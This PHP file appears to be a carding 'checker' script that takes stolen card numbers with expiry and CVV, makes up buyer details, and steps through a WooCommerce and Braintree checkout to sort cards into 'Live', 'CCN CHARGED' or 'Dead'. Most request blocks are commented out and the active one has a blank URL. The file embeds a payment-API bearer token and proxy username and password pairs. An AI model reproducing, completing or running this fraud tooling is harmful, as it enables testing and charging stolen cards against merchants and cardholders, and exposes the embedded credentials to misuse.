<?php


set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');

$ret = 0;
retry:
if ($ret > 3){
  echo 'Retried for 5 times | API Quitting check or recode';
  return;
}
function SID() {
    $data = openssl_random_pseudo_bytes(16);
    $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
    $data[8] = chr(ord($data[8]) & 0x3f | 0x80);
    return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
}

function corrid() {
    $correlationId = '';
    for ($i = 0; $i < 32; $i++) {
        $correlationId .= dechex(mt_rand(0, 15));
    }
    return $correlationId;
}

function devid() {
  return bin2hex(random_bytes(16));
}

# Randomize
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];


function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
$email = "yuno".rand(1, 200000)."@gmail.com";
$postal = rand(0000, 9999);
$devicerand = rand(4, 1000);
$randomshit = rand(000, 999);


If(strlen($ano) > 2)
{
  $ano1 = substr($ano,2,2);
}
If(substr($mes,0,1) == 0)
{
  $mes1 = substr($mes,1,1);
}else {
    $mes1 = $mes;
}

$cbin = substr($cc, 0,1);
if($cbin == "5"){
$cbin = "master-card";
}else if($cbin == "4"){
$cbin = "visa";
}else if($cbin == "3"){
$cbin = "amex";
}
 $bin = substr($cc,0,6);
 $cc1 = substr($cc,0,4);
 $cc2 = substr($cc, 4,4);
 $cc3 = substr($cc, 8, 4);
 $cc4 = substr($cc,12,4);
 $last2 = substr($cc, 14,2);

 $surnames = preg_split('//', 'montecalvo');
shuffle($surnames);
foreach($surnames as $surname) {

}
$t=time();
$date = (date("Ymdhs",$t));

$trans = rand(1,21);

switch ($trans) {
  case '1':
  $code = 'BA5 6ZH';
    break;
  case '2':
  $code = 'WF7 7HG';
    break;
  case '3':
  $code = 'CA6 9AG';
    break;
  case '4':
  $code = 'IV13 1UG';
    break;
  case '5':
  $code = 'TD1 2PY';
    break;
  case '6':
  $code = 'DG8 1XH';
    break;
  case '7':
  $code = 'AB35 3WW';
    break;
  case '8':
  $code = 'IP28 0LN';
    break;
  case '9':
  $code = 'GL15 6BU';
    break;
  case '10':
  $code = 'HU16 6RT';
    break;
      case '11':
  $code = 'HU09 6RT';
    break;
      case '12':
  $code = 'HU17 6RT';
    break;
      case '13':
  $code = 'HU10 6RT';
    break;
      case '14':
  $code = 'HU18 6RT';
    break;
      case '15':
  $code = 'HU16 7RT';
    break;
      case '16':
  $code = 'HU26 6RT';
    break;
      case '17':
  $code = 'HU13 6RT';
    break;
      case '18':
  $code = 'HU20 6RT';
    break;
      case '19':
  $code = 'HU21 6RT';
    break;
      case '20':
  $code = 'HU16 3RT';
    break;

  default:
  $code = 'AB13 6NL';


}

                    function numGenerate($length = 10) {
                        $characters = '0123456789';
                        $charactersLength = strlen($characters);
                        $randomString = '0';
                        for ($i = 0; $i < $length; $i++) {
                            $randomString .= $characters[rand(0, $charactersLength - 1)];
                        }
                        return $randomString."";
                    }
                    $randnum = numGenerate();


  //---------------------------------------------------------------------------------------------

#ADDTOCART

//$ch = curl_init();
//curl_setopt($ch, CURLOPT_URL, 'https://www.biom8.com/product/seborrheic-dermatitis-the-owners-manual/');
////curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
//curl_setopt($ch, CURLOPT_HEADER, 0);
//curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
//curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//curl_setopt($ch, CURLOPT_PROXY, $proxy);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $passwd);
//curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
//curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
//   curl_setopt($ch, CURLOPT_HTTPHEADER, array(   
//'authority: www.biom8.com',
//'accept: */*',
//'accept-language: en-US,en;q=0.9',
//'content-type: application/x-www-form-urlencoded; charset=UTF-8',
//'origin: https://www.biom8.com',
//'referer: https://www.biom8.com/product/seborrheic-dermatitis-the-owners-manual/',
//'sec-fetch-dest: empty',
//'sec-fetch-mode: cors',
//'sec-fetch-site: same-origin',
//'x-requested-with: XMLHttpRequest',
//'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edg/98.0.1108.55',
//));
//curl_setopt($ch, CURLOPT_POSTFIELDS, 'quantity=1&add-to-cart=354');
//echo$atc = curl_exec($ch);
//curl_close($ch);

//---------------------------------------------------------------------------------------------

#CHECKOUT

//$ch = curl_init();
//curl_setopt($ch, CURLOPT_URL, 'https://www.biom8.com/checkout/');
//curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
//curl_setopt($ch, CURLOPT_HEADER, 0);
//curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
//curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//curl_setopt($ch, CURLOPT_PROXY, $proxy);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $passwd);
//curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
//curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
//   curl_setopt($ch, CURLOPT_HTTPHEADER, array(   
//'authority: www.biom8.com',
//'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
//'accept-language: en-US,en;q=0.9',
//'referer: https://www.biom8.com/cart/',
//'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edg/98.0.1108.55',
//));
//$checkout = curl_exec($ch);
//curl_close($ch);
//$nonce = GetStr($checkout, '<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="','" />');

//---------------------------------------------------------------------------------------------

#GRAPHQL/TOKEN

//$ch = curl_init();
//curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
//curl_setopt($ch, CURLOPT_HEADER, 0);
//curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
//curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//// curl_setopt($ch, CURLOPT_PROXY, "http://zproxy.lum-superproxy.io:22225");
//// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "lum-customer-hl_f78e5ef8-zone-static:4i390yiladn8");
//curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
//curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
//    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
//'accept: */*',
//'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2ODY3NDI1NDEsImp0aSI6ImIwYTRmYTA3LTBlODYtNGRjNC1hYzJmLWRhZTRiMTNmN2NiNiIsInN1YiI6IjJ3czRtN3RqOGNxend3MjQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjJ3czRtN3RqOGNxend3MjQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImtlZXBzYWtlbW9tY3JlYXRpb25zX2luc3RhbnQifX0.P4KK_wM8Ccxo5XO3FRGdbhQroZW4d143BFTi3S0EsrnLAUf4yPR1b_d9BvuBPF4Jhi8XnUazMAujYtYv-Q6kqw',
//'braintree-version: 2018-05-10',
//'content-type: application/json',
//'Host: payments.braintree-api.com',
//'origin: https://assets.braintreegateway.com',
//'referer: https://assets.braintreegateway.com/'
//));
//curl_setopt($ch, CURLOPT_POSTFIELDS, '');
//  $pagamento = curl_exec($ch);
//
//$goods = json_decode($pagamento, true);
//$tok = $goods['data']['tokenizeCreditCard']['token'];
//$tok = getStr($pagamento, '"dataValue":"','"');
//$tok;

//---------------------------------------------------------------------------------------------

#AJAXCHECKOUT

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, '');
//curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//curl_setopt($ch, CURLOPT_PROXY, 'gate.smartproxy.com:7000');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'chadz123:chadz123');
//curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
//curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
   curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: application/json, text/javascript, */*; q=0.01',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'',
//'X-IYZI-TOKEN: a4acc271-2b04-43e9-a91d-930dd9854de9',
'Origin: ',
'Referer: ',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
//'Sec-Fetch-User: ?1',
'Sec-Fetch-Dest: empty'
));
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$pagamento = curl_exec($ch);
$ch = curl_init();
//---------------------------------------------------------------------------------------------   

//$err = GetStr($pagamento, '"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\t','\t\t<\/li>\n\t<\/ul>\n<input type=\"hidden\" id=\"wc_braintree_checkout_error\" value=\"true\" \/>"');

//$err = GetStr($pagamento, '"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\t','\t\t<\/li>\n\t<\/ul>\n"');
//
//
////$err = GetStr($pagamento1, '"notice":"','"');
//
// //----------------------------------------------------
//
// //-----------------------------------------------------
//
//if(strpos($pagamento,"success")) {
//echo "<font size=3 color='dark'><font class='badge badge-success'>Live</i></font> <font class='badge badge-success'> $lista </font> <font size=3 color='green'><font class='badge badge-success'>[ LIVE ]</i></font> <font class='badge badge-warning'> CCN CHARGED [$20] </i></font><br>";
//
//}
//elseif(strpos($pagamento, 'There was an error processing your payment. Reason: Invalid postal code or street address.')){
//echo "<font size=3 color='dark'><font class='badge badge-success'>Live</i></font> <font class='badge badge-success'> $lista </font> <font size=3 color='green'><font class='badge badge-success'>[ $err ]</i></font> <font class='badge badge-warning'>CVV: AVS </i></font><br>";
//
//}
//elseif(strpos($pagamento, 'There was an error processing your payment. Reason: Invalid postal code and cvv')){
//echo "<font size=3 color='dark'><font class='badge badge-success'>Live</i></font> <font class='badge badge-success'> $lista </font> <font size=3 color='green'><font class='badge badge-success'>[ $err ]</i></font> <font class='badge badge-warning'>CVV: AVS </i></font><br>";
//
//}
//elseif(strpos($pagamento, 'There was an error processing your payment. Reason: CVV.')){
//echo "<font size=3 color='dark'><font class='badge badge-success'>Live</i></font> <font class='badge badge-success'> $lista </font> <font size=3 color='green'><font class='badge badge-success'>[ $err ]</i></font> <font class='badge badge-warning'>CVV: AVS </i></font><br>";
//
//}
//elseif(strpos($pagamento, 'Card Issuer Declined CVV')){
//echo "<font size=3 color='dark'><font class='badge badge-success'>Live</i></font> <font class='badge badge-success'> $lista </font> <font size=3 color='green'><font class='badge badge-success'>[ CCN AUTH ]</i></font> <font class='badge badge-warning'>CVV: AUTH </i></font><br>";
//
//}
//elseif(strpos($pagamento,'cart')) {
//echo "<font size=3 color='dark'><font class='badge badge-danger'>Reprovada ☠</i></font> <font class='badge badge-danger'> $lista </i></font> <font size=3 color='red'><font class='badge badge-warning'>Dead</i></font> <font class='badge badge-dark'>ded</i></font> <font class='badge badge-primary'>[$ip]</i></font><br>";
//}
//elseif(strpos($pagamento,'cart')) {
//echo "<font size=3 color='dark'><font class='badge badge-danger'>Reprovada ☠</i></font> <font class='badge badge-danger'> $lista </i></font> <font size=3 color='red'><font class='badge badge-warning'>Dead</i></font> <font class='badge badge-dark'>ded</i></font> <font class='badge badge-primary'>[$ip]</i></font><br>";
//}
//elseif(strpos($pagamento, 'risk_threshold')) {
//goto retry;
//$ret++;
//}
//elseif(strpos($pagamento, 'Not enough units')) {
//goto retry;
//$ret++;
//} 
//else {
//   echo "<font size=3 color='dark'><font class='badge badge-danger'>Reprovada ☠</i></font> <font class='badge badge-danger'> $lista </i></font> <font size=3 color='red'><font class='badge badge-warning'>Dead</i></font> <font class='badge badge-dark'>$err</i></font> <font class='badge badge-primary'>[$ip1]</i></font><br>";
//} 


curl_close($ch);
unlink('cookie.txt');
ob_flush();
//echo $pagamento;
//echo $ip;
//echo $AuthBearer;
echo $Nonce;
?>